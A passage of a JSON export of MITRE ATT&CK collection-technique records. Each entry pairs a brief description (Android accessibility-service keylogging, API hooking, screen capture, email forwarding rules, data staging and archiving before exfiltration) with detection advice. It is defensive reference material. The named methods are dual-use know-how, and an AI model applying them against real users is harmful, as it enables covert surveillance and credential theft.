<code>AccessibilityService<\/code> class, overriding the <code>onAccessibilityEvent<\/code> method, and listening for the <code>AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED<\/code> event type. The event object passed into the function will contain the data that the user typed.<\/p>\n<p>Additional methods of keylogging may be possible if root access is available.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On Android, users can view and manage which applications have third-party keyboard access through the device settings in System -> Languages & input -> Virtual keyboard. On iOS, users can view and manage which applications have third-party keyboard access through the device settings in General -> Keyboard. On Android, users can view and manage which applications can use accessibility services through the device settings in Accessibility. The exact device settings menu locations may vary between operating system versions.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":458,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":458,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":463,"name":"T1430 - Location Tracking","sort_id":0,"external_id":"T1430","external_sub_id":null,"old_external_id":"MOB-T1033","old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary could use a malicious or exploited application to surreptitiously track the device's physical location through use of standard operating system APIs.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On both Android (6.0 and up) and iOS, the user can view which applications have permission to access device location through the device settings screen, and the user can choose to revoke the permissions.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":463,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":463,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":472,"name":"T1507 - Network Information Discovery","sort_id":0,"external_id":"T1507","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may use device sensors to collect information about nearby networks, such as Wi-Fi and Bluetooth.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":472,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":474,"name":"T1410 - Network Traffic Capture or Redirection","sort_id":0,"external_id":"T1410","external_sub_id":null,"old_external_id":"MOB-T1013","old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary may capture network traffic to and from the device to obtain credentials or other sensitive data, or redirect network traffic to flow through an adversary-controlled gateway to do the same.<\/p>\n<p>A malicious app could register itself as a VPN client on Android or iOS to gain access to network packets. However, on both platforms, the user must grant consent to the app to act as a VPN client, and on iOS the app requires a special entitlement that must be granted by Apple.<\/p>\n<p>Alternatively, if a malicious app is able to escalate operating system privileges, it may be able to use those privileges to gain access to network traffic.<\/p>\n<p>An adversary could redirect network traffic to an adversary-controlled gateway by establishing a VPN connection or by manipulating the device's proxy settings. For example, Skycure (Citation: Skycure-Profiles) describes the ability to redirect network traffic by installing a malicious iOS Configuration Profile.<\/p>\n<p>If applications encrypt their network traffic, sensitive data may not be accessible to an adversary, depending on the point of capture.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On both Android and iOS the user must grant consent to an app to act as a VPN. Both platforms also provide visual context to the user in the top status bar when a VPN connection is in place.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":474,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":474,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":484,"name":"T1513 - Screen Capture","sort_id":0,"external_id":"T1513","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may use screen captures to collect information about applications running in the foreground, capture user data, credentials, or other sensitive information. Applications running in the background can capture screenshots or videos of another application running in the foreground by using the Android <code>MediaProjectionManager<\/code> (generally requires the device user to grant consent).(Citation: Fortinet screencap July 2019)(Citation: Android ScreenCap1 2019) Background applications can also use Android accessibility services to capture screen contents being displayed by a foreground application.(Citation: Lookout-Monokle) An adversary with root access or Android Debug Bridge (adb) access could call the Android <code>screencap<\/code> or <code>screenrecord<\/code> commands.(Citation: Android ScreenCap2 2019)(Citation: Trend Micro ScreenCap July 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The user can view a list of apps with accessibility service privileges in the device settings.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":484,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":509,"name":"T1560 - Archive Collected Data","sort_id":0,"external_id":"T1560","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary may compress and\/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.<\/p>\n<p>Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.\n\nConsider detecting writing of files with extensions and\/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":509,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":509,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":509,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":510,"name":"T1560.003 - Archive via Custom Method","sort_id":0,"external_id":"T1560.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Custom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":510,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":510,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":510,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":511,"name":"T1560.002 - Archive via Library","sort_id":0,"external_id":"T1560.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/006\">Python<\/a> rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and\/or compress data.<\/p>\n<p>Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and\/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":511,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":511,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":511,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":512,"name":"T1560.001 - Archive via Utility","sort_id":0,"external_id":"T1560.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip(Citation: 7zip Homepage), WinRAR(Citation: WinRAR Homepage), and WinZip(Citation: WinZip Homepage). Most utilities include functionality to encrypt and\/or compress data.<\/p>\n<p>Some 3rd party utilities may be preinstalled, such as <code>tar<\/code> on Linux and macOS or <code>zip<\/code> on Windows systems.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and\/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":512,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":512,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":512,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":546,"name":"T1213.001 - Confluence","sort_id":0,"external_id":"T1213.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:<\/p>\n<ul>\n<li>Policies, procedures, and standards<\/li>\n<li>Physical \/ logical network diagrams<\/li>\n<li>System architecture diagrams<\/li>\n<li>Technical system documentation<\/li>\n<li>Testing \/ development credentials<\/li>\n<li>Work \/ project schedules<\/li>\n<li>Source code snippets<\/li>\n<li>Links to network shares and other internal resources<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nUser access logging within Atlassian's Confluence can be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.","platforms":[{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":546,"platform_id":9,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":552,"name":"T1056.004 - Credential API Hooking","sort_id":0,"external_id":"T1056.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32\/Ursnif.gen!I Sept 2017) Unlike <a href=\"https:\/\/attack.mitre.org\/techniques\/T1056\/001\">Keylogging<\/a>,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:<\/p>\n<ul>\n<li><strong>Hooks procedures<\/strong>, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Endgame Process Injection July 2017)<\/li>\n<li><strong>Import address table (IAT) hooking<\/strong>, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.(Citation: Endgame Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)<\/li>\n<li><strong>Inline hooking<\/strong>, which overwrites the first bytes in an API function to redirect code flow.(Citation: Endgame Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)\n\nRootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.\n\nVerify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":552,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":590,"name":"T1114.003 - Email Forwarding Rule","sort_id":0,"external_id":"T1114.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) <\/p>\n<p>Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.\n\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include `X-MS-Exchange-Organization-AutoForwarded` set to true, `X-MailFwdBy` and `X-Forwarded-To`. The `forwardingSMTPAddress` parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the `X-MS-Exchange-Organization-AutoForwarded` header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":590,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":590,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":611,"name":"T1056.002 - GUI Input Capture","sort_id":0,"external_id":"T1056.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: <a href=\"https:\/\/attack.mitre.org\/techniques\/T1548\/002\">Bypass User Access Control<\/a>).<\/p>\n<p>Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as AppleScript(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and PowerShell(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015). <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor process execution for unusual programs as well as malicious instances of [Command and Scripting Interpreter](https:\/\/attack.mitre.org\/techniques\/T1059) that could be used to prompt users for credentials.\n\nInspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and\/or sources.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":611,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":611,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":637,"name":"T1056.001 - Keylogging","sort_id":0,"external_id":"T1056.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">OS Credential Dumping<\/a> efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.<\/p>\n<p>Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:<\/p>\n<ul>\n<li>Hooking API callbacks used for processing keystrokes. Unlike <a href=\"https:\/\/attack.mitre.org\/techniques\/T1056\/004\">Credential API Hooking<\/a>, this focuses solely on API functions intended for processing keystroke data.<\/li>\n<li>Reading raw keystroke data from the hardware buffer.<\/li>\n<li>Windows Registry modifications.<\/li>\n<li>Custom drivers.<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":637,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":637,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":637,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":653,"name":"T1074.001 - Local Data Staging","sort_id":0,"external_id":"T1074.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1560\">Archive Collected Data<\/a>. Interactive command shells may be used, and common functionality within <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> and bash may be used to copy data into a staging location.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":653,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":653,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":653,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":654,"name":"T1114.001 - Local Email Collection","sort_id":0,"external_id":"T1114.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.<\/p>\n<p>Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in <code>C:\\Users\\&lt;username&gt;\\Documents\\Outlook Files<\/code> or <code>C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Outlook<\/code>.(Citation: Microsoft Outlook Files)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":654,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":722,"name":"T1074.002 - Remote Data Staging","sort_id":0,"external_id":"T1074.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1560\">Archive Collected Data<\/a>. Interactive command shells may be used, and common functionality within <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> and bash may be used to copy data into a staging location.<\/p>\n<p>In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may <a href=\"https:\/\/attack.mitre.org\/techniques\/T1578\/002\">Create Cloud Instance<\/a> and stage data in that instance.(Citation: Mandiant M-Trends 2020)<\/p>\n<p>By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and 